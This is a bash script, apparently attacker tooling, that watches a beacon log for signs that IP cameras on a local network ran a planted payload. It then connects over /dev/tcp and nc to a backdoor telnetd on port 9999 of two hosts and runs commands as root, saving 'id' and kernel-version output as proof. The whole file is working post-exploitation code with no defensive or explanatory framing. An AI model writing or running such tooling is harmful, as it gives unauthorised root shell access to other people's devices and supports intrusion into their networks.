#!/bin/bash
# Loop closer: watch for v2 payload execution, then capture root the moment it exists
LOG=/tmp/loop_closer.log
log() { echo "$(date '+%H:%M:%S') $*" >> "$LOG"; }
log "loop closer armed - watching for fss-ran beacon -> telnetd:9999"
SEEN=0
while true; do
  B=$(grep -c "BEACON" /tmp/fss_beacons.log 2>/dev/null || echo 0)
  if [ "$B" -gt "$SEEN" ]; then
    log "BEACON! count=$B (was $SEEN) - camera executed our payload"
    SEEN=$B
    for c in 51 39; do
      if timeout 3 bash -c "exec 3<>/dev/tcp/192.168.4.$c/9999" 2>/dev/null; then
        log "ROOT on .$c:9999 - telnetd alive! probing..."
        (printf 'id > /tmp/root_proof.txt; cat /proc/version >> /tmp/root_proof.txt\n'; sleep 2) | timeout 8 nc 192.168.4.$c 9999 > /tmp/pane1/192.168.4.$c/root_via_9999.txt 2>/dev/null
        log "root probe result: $(wc -c < /tmp/pane1/192.168.4.$c/root_via_9999.txt 2>/dev/null) bytes"
      else
        log ". $c:9999 not open yet (entrypoint ran, telnetd may need devpts)"
      fi
    done
  fi
  sleep 30
done
